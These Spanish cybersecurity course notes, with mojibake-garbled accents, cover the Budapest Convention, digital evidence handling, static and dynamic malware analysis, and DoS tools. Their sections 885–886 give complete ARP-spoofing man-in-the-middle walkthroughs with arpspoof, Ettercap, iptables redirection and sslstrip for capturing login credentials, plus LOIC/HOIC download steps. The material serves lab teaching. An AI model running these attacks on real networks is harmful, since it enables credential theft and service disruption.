## **882. Convenio de Budapest. Â¿CÃ³mo vamos en AmÃ©rica latina? Salvaguarda de evidencias digitales**

### ğŸ›ï¸ 1. Â¿QuÃ© es el CONVENIO DE BUDAPEST?

#### ğŸ” DefiniciÃ³n:

El **Convenio de Budapest**, tambiÃ©n conocido como el **Convenio sobre la Ciberdelincuencia**, es el **primer tratado internacional** que busca hacer frente a los **delitos informÃ¡ticos** mediante:

- Una legislaciÃ³n penal comÃºn entre paÃ­ses
- Procedimientos de investigaciÃ³n compatibles
- CooperaciÃ³n internacional rÃ¡pida y efectiva

ğŸ“… Fue adoptado el **23 de noviembre de 2001** en Budapest, HungrÃ­a, y entrÃ³ en vigor en 2004.

ğŸ”’ **Organizado por**: el Consejo de Europa (pero abierto a todos los paÃ­ses, incluso no europeos).

---

#### ğŸ§  Â¿QuÃ© delitos aborda?

Incluye **delitos como**:

| Tipo de delito                     | Ejemplo                                            |
| ---------------------------------- | -------------------------------------------------- |
| Acceso ilegal                      | Hackear una cuenta o sistema sin permiso           |
| InterceptaciÃ³n ilegal              | Escuchar comunicaciones sin autorizaciÃ³n           |
| DaÃ±os a sistemas o datos           | Borrar bases de datos o lanzar un ransomware       |
| Fraude informÃ¡tico                 | SuplantaciÃ³n de identidad o phishing bancario      |
| DistribuciÃ³n de malware            | Crear o vender virus o troyanos                    |
| Delitos relacionados con contenido | Distribuir pornografÃ­a infantil o contenido ilegal |
| Infracciones de derechos de autor  | PiraterÃ­a digital                                  |

---

### ğŸŒ 2. Â¿CÃ³mo vamos en AmÃ©rica Latina?

#### ğŸ‡ªğŸ‡º Â¿Es obligatorio firmarlo?

No. Cada paÃ­s **decide si lo firma y lo ratifica**. Solo entonces se compromete legalmente a cumplirlo.

#### ğŸ“Š SituaciÃ³n actual (AmÃ©rica Latina):

| PaÃ­s                       | Estado actual respecto al Convenio de Budapest                    |
| -------------------------- | ----------------------------------------------------------------- |
| **Chile**                  | âœ… Miembro pleno (ratificado en 2017)                             |
| **Colombia**               | âœ… Miembro pleno (ratificado en 2021)                             |
| **Costa Rica**             | âœ… Miembro pleno (ratificado en 2017)                             |
| **Rep. Dominicana**        | âœ… Miembro pleno (ratificado en 2013)                             |
| **Argentina**              | ğŸ•’ Invitado a firmar, pero aÃºn sin ratificar                      |
| **PerÃº**                   | âŒ No ha firmado ni ratificado                                    |
| **MÃ©xico**                 | ğŸ•’ Invitado a firmar, pero sin ratificaciÃ³n                       |
| **Brasil**                 | âŒ No es parte, pero tiene leyes propias contra delitos digitales |
| **Ecuador, Bolivia, etc.** | âŒ No miembros aÃºn                                                |

ğŸ” **ConclusiÃ³n**: En AmÃ©rica Latina, **solo unos pocos paÃ­ses lo han ratificado**. Otros estÃ¡n en proceso o aÃºn no han mostrado avances significativos.

---

### ğŸ§¾ 3. Â¿QuÃ© es la SALVAGUARDA DE EVIDENCIAS DIGITALES?

#### ğŸ” DefiniciÃ³n:

La **salvaguarda de evidencias digitales** es el proceso de **identificar, preservar, recopilar y analizar** datos electrÃ³nicos **sin alterarlos**, para que puedan usarse como prueba **en una investigaciÃ³n o juicio**.

---

#### ğŸ§° Â¿CÃ³mo se hace?

| Etapa                 | DescripciÃ³n                                                                   |
| --------------------- | ----------------------------------------------------------------------------- |
| **1. IdentificaciÃ³n** | Encontrar el dispositivo o sistema relevante (servidor, disco, celular...)    |
| **2. PreservaciÃ³n**   | Protegerlo de modificaciones (desconectar de red, hacer imagen forense)       |
| **3. AdquisiciÃ³n**    | Clonar los datos (ej. con herramientas como `dd`, FTK Imager, Autopsy)        |
| **4. AnÃ¡lisis**       | Buscar evidencia relevante (IP, logs, mensajes, archivos eliminados)          |
| **5. DocumentaciÃ³n**  | Registrar **paso a paso todo lo hecho**, para asegurar **cadena de custodia** |

ğŸ›¡ï¸ **Cadena de custodia**: documento donde se registra **quiÃ©n tuvo acceso a la evidencia, cuÃ¡ndo y para quÃ©**, para garantizar que no fue manipulada.

---

### ğŸ§  Ejemplo prÃ¡ctico sencillo

#### Escenario:

La empresa **â€œRedSegura S.A.C.â€** sufriÃ³ una intrusiÃ³n. El hacker robÃ³ informaciÃ³n del servidor web.

El equipo de respuesta quiere conservar evidencia para denunciar y posiblemente usarla en juicio.

#### ğŸ” Paso a paso:

1. **IdentificaciÃ³n**:
   Se detecta que el servidor `192.168.1.15` fue comprometido.

2. **PreservaciÃ³n**:
   Se desconecta el servidor de internet. Se hace una imagen forense del disco con el comando:

   ```bash
   dd if=/dev/sda of=/mnt/disco_evidencia/redsegura_sda.img bs=4M
   ```

3. **AdquisiciÃ³n y anÃ¡lisis**:
   Se analiza la imagen con **Autopsy** y se detecta:

   - Archivos maliciosos con shells
   - Logs con IPs de conexiÃ³n sospechosas
   - Cuentas de usuario creadas sin permiso

4. **DocumentaciÃ³n**:
   Todo queda registrado:

   - Herramientas usadas
   - Fechas y horarios
   - Acciones realizadas
   - Firma del analista

5. **Entrega a autoridades**:
   Se firma un **acta de cadena de custodia** y se entrega la evidencia al fiscal de delitos informÃ¡ticos.

---

### ğŸ“Œ ConclusiÃ³n clave

| Concepto                     | Clave para entender                                                         |
| ---------------------------- | --------------------------------------------------------------------------- |
| **Convenio de Budapest**     | Marco legal internacional contra ciberdelitos. AmÃ©rica Latina avanza lento. |
| **Salvaguarda de evidencia** | Proteger pruebas digitales sin alterar su integridad.                       |
| **Importancia**              | Sin buenas prÃ¡cticas, no se puede castigar legalmente al atacante           |

---

[ğŸ”¼](#Ã­ndice)

---

## **883. Malware y AnÃ¡lisis estÃ¡tico de malware**

### ğŸ¦  Â¿QuÃ© es el MALWARE?

**Malware** es una palabra compuesta de â€œmalicious softwareâ€ (software malicioso). Son **programas diseÃ±ados para daÃ±ar, infiltrarse o robar informaciÃ³n** sin el consentimiento del usuario.

---

#### ğŸ§¬ Tipos comunes de malware:

| Tipo           | QuÃ© hace                                                        | Ejemplo fÃ¡cil                               |
| -------------- | --------------------------------------------------------------- | ------------------------------------------- |
| **Virus**      | Infecta otros archivos ejecutables                              | Se copia a Word.exe                         |
| **Gusano**     | Se propaga por la red sin ayuda de un archivo anfitriÃ³n         | Se envÃ­a por correo automÃ¡ticamente         |
| **Troyano**    | Se disfraza de programa Ãºtil pero tiene cÃ³digo malicioso oculto | Supuesto instalador de juegos, pero roba    |
| **Ransomware** | Cifra archivos y exige dinero para recuperarlos                 | Cifra tus documentos y pide pago en Bitcoin |
| **Spyware**    | EspÃ­a al usuario sin que lo sepa                                | Registra tus teclas (keylogger)             |
| **Adware**     | Muestra anuncios no deseados                                    | Abre ventanas emergentes sin parar          |
| **Rootkits**   | Ocultan su presencia para evitar ser detectados por antivirus   | Se instalan en el sistema operativo         |

---

### ğŸ§ª Â¿QuÃ© es el ANÃLISIS ESTÃTICO DE MALWARE?

Es una tÃ©cnica para analizar un archivo malicioso **sin ejecutarlo**, examinando su estructura, cÃ³digo y comportamiento **de forma segura**.

---

#### ğŸ¯ Â¿Para quÃ© sirve?

- Entender quÃ© hace el malware
- Saber si es peligroso
- Ver si roba informaciÃ³n, se propaga, o encripta archivos
- Identificar indicadores de compromiso (IoCs)

---

### ğŸ” Herramientas para anÃ¡lisis estÃ¡tico

AquÃ­ algunas herramientas muy Ãºtiles:

| Herramienta              | FunciÃ³n principal                               |
| ------------------------ | ----------------------------------------------- |
| **VirusTotal**           | Subir archivo y ver quÃ© antivirus lo detectan   |
| **Strings**              | Extraer texto del archivo                       |
| **PEStudio**             | Analizar archivos ejecutables (.exe) en Windows |
| **BinText**              | Ver texto legible dentro del ejecutable         |
| **Detect It Easy (DIE)** | Identifica si estÃ¡ ofuscado o empaquetado       |
| **Ghidra**               | IngenierÃ­a inversa (decompilador)               |

---

### ğŸ› ï¸ Â¿CÃ³mo instalar un entorno seguro para analizar malware?

Lo mejor es hacerlo **en una mÃ¡quina virtual aislada** (sandbox). AquÃ­ van los pasos:

---

#### ğŸ§± PASO 1: Crear una mÃ¡quina virtual segura

Puedes usar **VirtualBox** o **VMware**:

- Instala **VirtualBox** en tu PC
- Descarga una **ISO de Windows 10** desde Microsoft (modo evaluaciÃ³n)
- Crea una mÃ¡quina virtual de **Windows 10 sin conexiÃ³n a internet**

ğŸ’¡ _Opcional: Puedes usar Kali Linux si prefieres herramientas en Linux, pero la mayorÃ­a de malware apunta a Windows._

---

#### ğŸ” PASO 2: Desactiva internet en la VM

Para evitar propagaciÃ³n o filtraciÃ³n, **nunca tengas la VM con malware conectada a Internet.**

En VirtualBox:

1. Ve a **ConfiguraciÃ³n > Red**
2. Selecciona **"No conectado"**

---

#### ğŸ§° PASO 3: Instala herramientas dentro de la VM

Instala estas herramientas de anÃ¡lisis (descÃ¡rgalas primero desde tu PC anfitriÃ³n y transfiÃ©relas por carpeta compartida):

- [DIE (Detect It Easy)](https://ntinfo.biz/)
- [Strings (Sysinternals)](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)
- [BinText](https://www.mcafee.com/enterprise/en-us/downloads/free-tools/bintext.html)
- [PEStudio](https://www.winitor.com/)
- [Ghidra (opcional)](https://ghidra-sre.org/)

---

### âœ… EJEMPLO COMPLETO: AnÃ¡lisis estÃ¡tico paso a paso

SupÃ³n que tienes un archivo llamado `sospechoso.exe`. Vamos a hacer un anÃ¡lisis estÃ¡tico **sin ejecutarlo**.

---

#### ğŸ” PASO 1: Examinar con Strings

Usamos Strings para ver si hay textos legibles:

```bash
strings sospechoso.exe > salida.txt
```

ğŸ“Œ Resultado: encuentras cosas como:

```
http://malicioso.com/puerta
C:\Users\Admin\secreto.txt
cmd.exe /c del archivo
```

ğŸ§  **InterpretaciÃ³n**: El archivo hace llamadas a Internet y ejecuta comandos.

---

#### ğŸ§ª PASO 2: Usar PEStudio

Abre `sospechoso.exe` con PEStudio:

- PEStudio te muestra:

  - Permisos solicitados
  - Importaciones de funciones como `CreateRemoteThread`, `LoadLibrary`, etc.
  - Si estÃ¡ empaquetado con UPX u otros mÃ©todos

---

#### ğŸ” PASO 3: Comprobar en VirusTotal (solo si es seguro)

Desde tu PC anfitriÃ³n (no la VM), sube el archivo a:

ğŸ‘‰ [https://virustotal.com](https://virustotal.com)

ğŸ“Œ Resultado:

- 43 de 70 antivirus lo detectan como "Trojan.Generic" o similar

---

#### ğŸ”© PASO 4: Ver si estÃ¡ ofuscado (DIE)

Abres `sospechoso.exe` en DIE.

Resultado:

- Detecta que estÃ¡ comprimido con UPX.

âœ… Esto indica que el archivo estÃ¡ empaquetado para ocultar su verdadero cÃ³digo.

---

### ğŸ›¡ï¸ RECOMENDACIONES DE SEGURIDAD

- Siempre analiza dentro de una **mÃ¡quina virtual aislada**
- No abras el malware en tu PC personal
- No lo conectes a internet
- Toma **snapshots** antes de empezar por si algo falla
- Desactiva antivirus de la VM (pueden borrar el malware sin que analices)

---

### ğŸ§  CONCLUSIÃ“N

| Concepto                  | ExplicaciÃ³n fÃ¡cil                                          |
| ------------------------- | ---------------------------------------------------------- |
| **Malware**               | Software malicioso que daÃ±a o roba informaciÃ³n             |
| **AnÃ¡lisis estÃ¡tico**     | Examinar malware sin ejecutarlo                            |
| **Herramientas clave**    | Strings, PEStudio, DIE, VirusTotal, Ghidra                 |
| **Entorno seguro**        | MÃ¡quina virtual sin internet, con herramientas             |
| **Resultado del ejemplo** | Se detectÃ³ que `sospechoso.exe` era un troyano empaquetado |

---

[ğŸ”¼](#Ã­ndice)

---

## **884. Malware y AnÃ¡lisis dinÃ¡mico de malware**

### ğŸ¦  Â¿QuÃ© es el MALWARE?

**Malware** = â€œMalicious Softwareâ€ (software malicioso). Es cualquier programa o cÃ³digo que tiene como intenciÃ³n **daÃ±ar, infectar, robar, espiar o interrumpir** el sistema de un usuario sin su consentimiento.

---

#### ğŸ”¥ Tipos comunes de malware (con ejemplos):

| Tipo       | Â¿QuÃ© hace?                                           | Ejemplo simple                        |
| ---------- | ---------------------------------------------------- | ------------------------------------- |
| Virus      | Infecta archivos para propagarse                     | Infecta Word.exe y se propaga         |
| Troyano    | Se oculta como algo Ãºtil pero tiene cÃ³digo malicioso | "Crack de juego" que roba contraseÃ±as |
| Ransomware | Cifra archivos y pide dinero para recuperarlos       | Bloquea tus fotos y pide bitcoins     |
| Gusano     | Se propaga por red sin intervenciÃ³n humana           | Se copia por correo sin permiso       |
| Keylogger  | Graba lo que escribes (contraseÃ±as, chats, etc.)     | Envia tus claves por correo           |

---

### ğŸ§ª Â¿QuÃ© es el ANÃLISIS DINÃMICO de MALWARE?

Es una tÃ©cnica que **ejecuta el malware en un entorno controlado** (sandbox o laboratorio virtual) para observar su **comportamiento en tiempo real**.

---

#### ğŸ¯ Â¿Para quÃ© sirve?

- Ver quÃ© archivos modifica o crea
- QuÃ© procesos inicia
- A quÃ© direcciones se conecta
- QuÃ© claves del registro cambia
- Si crea persistencia en el sistema
- QuÃ© se descarga o quÃ© roba

---

### ğŸ› ï¸ Â¿CÃ³mo se hace de forma segura?

#### âš ï¸ Importante: **NUNCA** ejecutes malware en tu computadora normal. Siempre usa una **mÃ¡quina virtual sin internet ni antivirus.**

---

### ğŸ§° Herramientas para anÃ¡lisis dinÃ¡mico:

| Herramienta                | Â¿Para quÃ© sirve?                                |
| -------------------------- | ----------------------------------------------- |
| **Procmon** (Sysinternals) | Ver archivos, procesos y claves modificadas     |
| **Process Explorer**       | Ver procesos en ejecuciÃ³n                       |
| **Wireshark**              | Capturar trÃ¡fico de red                         |
| **Autoruns**               | Ver persistencia automÃ¡tica (inicio de Windows) |
| **Regshot**                | Comparar cambios en el registro                 |
| **FakeNet-NG**             | Simula servidores de red para ver trÃ¡fico       |
| **INetSim**                | Emula servicios de red (DNS, HTTP, FTP, etc.)   |
| **Any.Run / FLARE-VM**     | Entornos especializados (mÃ¡s avanzados)         |

---

### ğŸ–¥ï¸ CÃ³mo instalar un entorno de anÃ¡lisis dinÃ¡mico (modo laboratorio seguro)

#### ğŸ§± Paso 1: Instalar una mÃ¡quina virtual

Puedes usar:

- [VirtualBox (gratis)](https://www.virtualbox.org/)
- [VMware Workstation Player (gratis)](https://www.vmware.com/)

Usaremos una mÃ¡quina virtual con **Windows 10** (ideal porque muchos malware estÃ¡n hechos para Windows).

ğŸ’¡ **Descarga oficial Windows ISO** (modo evaluaciÃ³n):

ğŸ‘‰ [https://www.microsoft.com/en-us/software-download/windows10](https://www.microsoft.com/en-us/software-download/windows10)

---

#### ğŸ›‘ Paso 2: Aislar la mÃ¡quina virtual

En VirtualBox:

- Configura **Red > No Conectado**
- Desactiva carpetas compartidas y portapapeles bidireccionales

---

#### ğŸ“¦ Paso 3: Instala herramientas dentro de la VM

Desde tu PC real (anfitriÃ³n), descarga las herramientas y pÃ¡salas por una carpeta compartida (Â¡no conectes la VM a internet!).

##### Herramientas clave:

1. **Process Monitor (Procmon)** â€“ ver actividad de disco y registro
2. **Process Explorer** â€“ para ver procesos activos
3. **Regshot** â€“ tomar capturas del registro antes y despuÃ©s
4. **Wireshark** â€“ capturar trÃ¡fico (opcional si simulas red)
5. **Autoruns** â€“ ver programas que se ejecutan al iniciar
6. **FakeNet-NG** o **INetSim** â€“ para simular servidores (avanzado)

---

### âœ… EJEMPLO COMPLETO: AnÃ¡lisis dinÃ¡mico paso a paso

Supongamos que tienes un archivo sospechoso llamado `malicioso.exe`.

---

#### ğŸ” Paso 1: Prepara entorno

1. **Toma snapshot** de la mÃ¡quina virtual.
2. Abre **Regshot**, toma una primera foto del registro.
3. Abre **Procmon** (filtra solo eventos relacionados con el ejecutable).
4. Abre **Process Explorer**.

---

#### â–¶ï¸ Paso 2: Ejecuta el malware

- Haz doble clic en `malicioso.exe`
- Observa en **Procmon**:

  - Archivos que crea (ej: `C:\Users\Admin\AppData\temp\xyz.exe`)
  - Cambios en el registro (ej: claves de inicio automÃ¡tico)

- Observa en **Process Explorer**:

  - Procesos hijos creados
  - Si se inyecta en otro proceso (sospechoso)

---

#### ğŸ•µï¸ Paso 3: Captura del trÃ¡fico de red (opcional)

- Abre **Wireshark** o FakeNet-NG
- Observa si intenta conectarse a:

  - IPs externas (ej: `185.192.80.2`)
  - URLs (ej: `http://stealinfo.ru`)

---

#### ğŸ§¾ Paso 4: ComparaciÃ³n de cambios

- En **Regshot**, toma una segunda foto del registro
- Compara:

  - Â¿Se agregÃ³ algo a `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`?
    â†’ Esto indica persistencia

---

#### ğŸ“Œ Resultado del anÃ¡lisis:

**Resumen:**

- `malicioso.exe` crea otro archivo oculto
- Modifica el registro para ejecutarse al iniciar Windows
- Intenta conectarse a `http://123.45.67.89/bot.php`
- Se inyecta en `explorer.exe`

**ConclusiÃ³n:** Es un troyano que se instala, persiste y se conecta con un servidor externo â†’ POSIBLE botnet o robo de informaciÃ³n.

---

### ğŸ§  CONSEJOS FINALES:

| Seguridad                       | RecomendaciÃ³n                                                                                             |
| ------------------------------- | --------------------------------------------------------------------------------------------------------- |
| MÃ¡quina virtual sin internet    | Nunca conectes el malware a internet real                                                                 |
| Snapshot antes de empezar       | Para poder volver al estado original                                                                      |
| No abras malware fuera de la VM | Ni en tu celular, ni en tu PC real                                                                        |
| Usa malware de prueba legal     | Como EICAR o muestras en sitios como [malware-traffic-analysis.net](http://malware-traffic-analysis.net/) |

---

### ğŸ“š Â¿DÃ³nde practicar legalmente?

- [https://malware-traffic-analysis.net/](https://malware-traffic-analysis.net/)
- [https://thezoo.morirt.com/](https://thezoo.morirt.com/) _(cuidado, usar solo en VM aisladas)_
- [https://any.run](https://any.run) _(sandbox online gratuito con anÃ¡lisis dinÃ¡mico en tiempo real)_

---

[ğŸ”¼](#Ã­ndice)

---

## **885. Sniffing y CÃ³mo realizar un ataque Man in the middle automatico**

### ğŸ•µï¸â€â™‚ï¸ Â¿QuÃ© es Sniffing?

**Sniffing** es el proceso de **capturar y analizar el trÃ¡fico de red** que pasa por una interfaz de red.

#### ğŸ¯ Objetivo:

Ver quÃ© informaciÃ³n viaja por la red, como:

- Usuarios y contraseÃ±as
- Cookies de sesiÃ³n
- Sitios visitados
- Archivos descargados

---

#### ğŸ“¦ Tipos de sniffing:

| Tipo       | Â¿QuÃ© hace?                                                                  |
| ---------- | --------------------------------------------------------------------------- |
| **Pasivo** | Solo escucha el trÃ¡fico que pasa, sin interferir (como un espÃ­a silencioso) |
| **Activo** | Interfiere para redirigir o manipular trÃ¡fico (como en MITM)                |

---

### ğŸ¦¹ Â¿QuÃ© es un ataque **Man-in-the-Middle (MITM)?**

Es un ataque donde el atacante se **interpone entre dos partes que se comunican**, como un router y un usuario.

**Ejemplo simple:**

Imagina que Alice quiere hablar con Bob, pero Eve (el atacante) se mete en medio:

```
Alice --> [Eve (atacante)] --> Bob
```

Alice cree que estÃ¡ hablando con Bob, y Bob cree que estÃ¡ hablando con Alice. Pero **Eve ve todo** y puede incluso **modificar los mensajes**.

---

### ğŸ”§ Â¿QuÃ© necesito para practicar?

Usaremos un **entorno seguro de laboratorio con Kali Linux**. No lo hagas en redes reales sin permiso.

#### âœ… Herramientas necesarias (todas vienen en Kali Linux):

- **Ettercap**: para ataques MITM automÃ¡ticos
- **Wireshark**: para ver el trÃ¡fico capturado
- **arpspoof** (opcional)
- **iptables** (para redireccionar trÃ¡fico)
- **sslstrip** (para bajar HTTPS a HTTP)

---

### ğŸ–¥ï¸ PASO A PASO: CÃ³mo instalar el entorno (si no tienes Kali)

1. **Descargar Kali Linux** desde su web oficial:

   ğŸ‘‰ [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

2. **InstÃ¡lalo en una mÃ¡quina virtual (VirtualBox o VMware)**
   Configura red en modo â€œred internaâ€ o â€œbridgeâ€ para que tu Kali pueda interactuar con otras mÃ¡quinas virtuales (como una vÃ­ctima con Windows).

---

### ğŸ¯ ESCENARIO DE PRUEBA

- Kali Linux = atacante
- MÃ¡quina vÃ­ctima = Windows 10 (puedes crear otra VM con Windows)

---

### ğŸ”¥ PRÃCTICA COMPLETA: Ataque MITM automÃ¡tico con Ettercap

---

#### ğŸ›  Paso 1: Configura la red

En VirtualBox:

- Ambos (Kali y Windows) deben estar en **red interna** o **modo puente**.

Verifica que Kali pueda hacer ping a la vÃ­ctima.

```bash
ping 192.168.1.5  # IP de la vÃ­ctima
```

---

#### ğŸ›  Paso 2: Activar IP forwarding en Kali

Esto permite que Kali reenvÃ­e trÃ¡fico para que la vÃ­ctima no sospeche.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

#### ğŸ›  Paso 3: Ejecutar Ettercap

Abre Ettercap en modo grÃ¡fico:

```bash
ettercap -G
```

Pasos en la interfaz grÃ¡fica:

1. Ir a **Sniff â†’ Unified sniffing**
2. Selecciona la interfaz de red (ej. `eth0` o `enp0s3`)
3. Ve a **Hosts â†’ Scan for hosts**
4. Luego a **Hosts â†’ Host list**

   - Selecciona la IP del **router/gateway** y haz clic en â€œAdd to Target 1â€
   - Selecciona la IP de la **vÃ­ctima** y haz clic en â€œAdd to Target 2â€

5. Ve a **Mitm â†’ ARP poisoning**

   - Marca â€œSniff remote connectionsâ€

6. Finalmente ve a **Start â†’ Start sniffing**

---

#### ğŸ•µï¸ Paso 4: Captura con Wireshark

Abre Wireshark en Kali y selecciona la misma interfaz (ej. `eth0`) para empezar a ver los paquetes.

Filtra por protocolos interesantes:

```bash
http
ftp
telnet
```

---

#### ğŸ EJEMPLO REAL: Captura de contraseÃ±as HTTP

1. La vÃ­ctima entra a una web con login no cifrado (ej. [http://testphp.vulnweb.com/login.php](http://testphp.vulnweb.com/login.php))
2. Kali intercepta y ve:

```
POST /login.php HTTP/1.1
username=admin&password=1234
```

ğŸ‰ Â¡ContraseÃ±a capturada!

---

### âš ï¸ Â¿CÃ³mo funciona tÃ©cnicamente el ataque?

Usamos **ARP poisoning**, que consiste en enviar respuestas falsas de ARP para engaÃ±ar a los dispositivos de la red.

> El atacante dice: â€œÂ¡Hola! Yo soy el routerâ€ al usuario
> Y al router le dice: â€œÂ¡Hola! Yo soy el usuarioâ€

Esto redirige el trÃ¡fico a travÃ©s del atacante.

---

### ğŸ›¡ Â¿CÃ³mo protegerse?

| Medida de protecciÃ³n      | Â¿CÃ³mo ayuda?                                      |
| ------------------------- | ------------------------------------------------- |
| HTTPS en todas las webs   | Evita ver contenido Ãºtil al sniffing              |
| Red segmentada            | Dificulta el MITM en redes pÃºblicas               |
| IP/MAC estÃ¡tica           | Reduce riesgo de ARP spoofing                     |
| VPN                       | Cifra todo el trÃ¡fico, incluso en redes inseguras |
| DetecciÃ³n de ARP spoofing | Herramientas como `arpwatch`, `XArp`              |

---

### ğŸ§  ConclusiÃ³n

- **Sniffing** permite capturar trÃ¡fico de red.
- **Ataques MITM** son una forma activa de interceptar comunicaciones.
- Con herramientas como **Ettercap** puedes automatizar el proceso fÃ¡cilmente.
- Solo practÃ­calo en entornos **controlados y legales**.

---

[ğŸ”¼](#Ã­ndice)

---

## **886. Sniffing y CÃ³mo realizar un ataque Man in the middle manual**

### ğŸ§  Â¿QuÃ© es Sniffing?

**Sniffing** significa **â€œhusmearâ€ el trÃ¡fico de red**. Consiste en capturar los paquetes de datos que viajan entre dispositivos.
Un sniffer permite al atacante ver lo que los usuarios estÃ¡n haciendo en la red: contraseÃ±as, mensajes, sitios web visitados, etc.

---

### ğŸ­ Â¿QuÃ© es un Ataque Man-In-The-Middle (MITM)?

Un **MITM** es cuando un atacante se **interpone entre dos dispositivos que se comunican**, como un router y una vÃ­ctima, sin que ellos lo noten.
El atacante intercepta, registra o incluso modifica esa informaciÃ³n.

**Ejemplo grÃ¡fico:**

```
[VÃ­ctima] â†”ï¸ [Atacante] â†”ï¸ [Router]
```

---

### ğŸ› ï¸ Herramientas necesarias para el MITM manual:

Vamos a usar:

| Herramienta             | Uso                                             |
| ----------------------- | ----------------------------------------------- |
| `arpspoof`              | Para engaÃ±ar a los dispositivos con ARP         |
| `tcpdump` o `wireshark` | Para capturar paquetes                          |
| `iptables`              | Para redireccionar trÃ¡fico (si analizamos HTTP) |
| `sslstrip`              | (Opcional) Para bajar HTTPS a HTTP              |

---

### ğŸ”§ PASO A PASO: PreparaciÃ³n del entorno

#### ğŸ“¥ Paso 1: Instalar Kali Linux (si no lo tienes)

1. Descarga Kali desde: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
2. InstÃ¡lalo en VirtualBox o VMware.
3. Configura la red en modo **Bridge** o **Red interna** (con otra VM vÃ­ctima, por ejemplo con Windows o Ubuntu).

---

#### ğŸ“¡ Paso 2: Verifica conectividad

Verifica que puedes hacer ping desde Kali hacia la vÃ­ctima:

```bash
ping 192.168.1.5  # IP de la vÃ­ctima
```

---

### ğŸ”¥ MANUAL MITM: Ejemplo completo paso a paso

#### ğŸ§ª ESCENARIO:

- Kali Linux = atacante
- Windows 10 = vÃ­ctima
- Ambos estÃ¡n en la misma red local

---

#### ğŸ”¢ Paso 1: Descubre la IP de la vÃ­ctima

```bash
netdiscover -r 192.168.1.0/24
```

O usa:

```bash
arp-scan -l
```

Anota:

- IP de la vÃ­ctima: `192.168.1.5`
- IP del gateway/router: `192.168.1.1`

---

#### ğŸ§° Paso 2: Activa el reenvÃ­o de paquetes (IP forwarding)

Esto es para que la vÃ­ctima no pierda conexiÃ³n cuando el trÃ¡fico pase por Kali.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

#### ğŸ§¨ Paso 3: Ejecuta ARP Spoofing manual

Con `arpspoof`, Kali se hace pasar por el router frente a la vÃ­ctima y viceversa.

1. Terminal 1 (suplantar el router ante la vÃ­ctima):

```bash
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
```

2. Terminal 2 (suplantar la vÃ­ctima ante el router):

```bash
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5
```

> AsegÃºrate de que `eth0` es tu interfaz (verifÃ­calo con `ip a`).

---

#### ğŸ•µï¸ Paso 4: Captura el trÃ¡fico con Wireshark o tcpdump

Ejemplo con `tcpdump`:

```bash
tcpdump -i eth0 -w mitm-captura.pcap
```

O Wireshark:

```bash
wireshark &
```

Filtra por `http`, `ftp`, `telnet` para ver credenciales fÃ¡cilmente.

---

#### ğŸŒ Paso 5: Victima navega por sitios HTTP (no HTTPS)

PÃ­dele (o simula) que acceda a una web con login vulnerable:

```http
http://testphp.vulnweb.com/login.php
```

Wireshark mostrarÃ¡ algo como:

```
POST /login.php HTTP/1.1
Host: testphp.vulnweb.com
username=admin&password=123456
```

ğŸ‰ Â¡Datos interceptados!

---

### ğŸ”’ Â¿Y si el sitio usa HTTPS?

AquÃ­ es donde **sslstrip** entra:

1. Redirige trÃ¡fico a puerto 10000:

```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```

2. Ejecuta sslstrip:

```bash
sslstrip -l 10000
```

Esto convierte conexiones HTTPS en HTTP (cuando es posible), para ver los datos sin cifrado.

---

### âœ… Â¿CÃ³mo revertir el ataque?

1. DetÃ©n los procesos `arpspoof`, `sslstrip`, etc.
2. Desactiva el IP forwarding:

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

3. Limpia iptables:

```bash
iptables -F
iptables -t nat -F
```

---

### ğŸ§  RESUMEN DEL FLUJO:

1. Kali engaÃ±a a vÃ­ctima y router con `arpspoof`
2. Redirige trÃ¡fico si quieres usar `sslstrip`
3. Captura trÃ¡fico con `tcpdump` o `Wireshark`
4. Observa credenciales y otros datos en sitios HTTP

---

### ğŸ“Œ CONSEJO

Este ataque puede ser detectado por IDS/IPS modernos o herramientas como `arpwatch` o `XArp`. TambiÃ©n falla en redes con protecciÃ³n ARP o trÃ¡fico encriptado por VPN.

---

[ğŸ”¼](#Ã­ndice)

---

## **887. DenegaciÃ³n de servicio. Ataque DOS con LOIC y HOIC**

### ğŸ§  Â¿QuÃ© es un Ataque de DenegaciÃ³n de Servicio (DoS)?

Un ataque **DoS (Denial of Service)** busca **inutilizar un sistema, servidor o red**, haciendo que no pueda responder a usuarios legÃ­timos. Esto se logra **inundando el servidor con trÃ¡fico basura** o **consumiendo todos sus recursos**.

> ImagÃ­nate una pizzerÃ­a que solo tiene una lÃ­nea telefÃ³nica y alguien llama sin parar para que los clientes reales no puedan pedir.

---

#### ğŸ§¨ Diferencia entre DoS y DDoS

| Tipo     | DescripciÃ³n                                           |
| -------- | ----------------------------------------------------- |
| **DoS**  | Un solo atacante lanza el ataque.                     |
| **DDoS** | Ataque distribuido desde mÃºltiples equipos (botnets). |

---

### ğŸ› ï¸ Herramientas: LOIC y HOIC

#### 1. **LOIC (Low Orbit Ion Cannon)**

- Herramienta para realizar ataques DoS/DDoS.
- Interfaz grÃ¡fica.
- Se puede controlar remotamente por IRC.

#### 2. **HOIC (High Orbit Ion Cannon)**

- MÃ¡s avanzado que LOIC.
- Permite usar â€œbooster scriptsâ€.
- EnvÃ­o de trÃ¡fico HTTP simulado mÃ¡s complejo.

---

### ğŸ”§ InstalaciÃ³n de LOIC y HOIC

> âš ï¸ Usa mÃ¡quinas virtuales y laboratorios locales. Nunca ataques sitios reales.

#### ğŸ–¥ï¸ Requisitos:

- Windows o Kali Linux (con Wine)
- Java (para HOIC)
- Entorno de laboratorio con un servidor web (por ejemplo, XAMPP)

---

#### ğŸ’» Instalar LOIC en Windows:

1. Descarga desde un mirror confiable como:
   [https://github.com/NewEraCracker/LOIC](https://github.com/NewEraCracker/LOIC)

2. Extrae el archivo `.zip`.

3. Ejecuta `LOIC.exe`.

---

#### ğŸ’» Instalar HOIC en Windows:

1. Descarga desde:
   [https://sourceforge.net/projects/high-orbit-ion-cannon/](https://sourceforge.net/projects/high-orbit-ion-cannon/)

2. Descomprime y ejecuta `HOIC.exe`.

> Si no abre, asegÃºrate de tener **.NET Framework** y **Java** instalados.

---

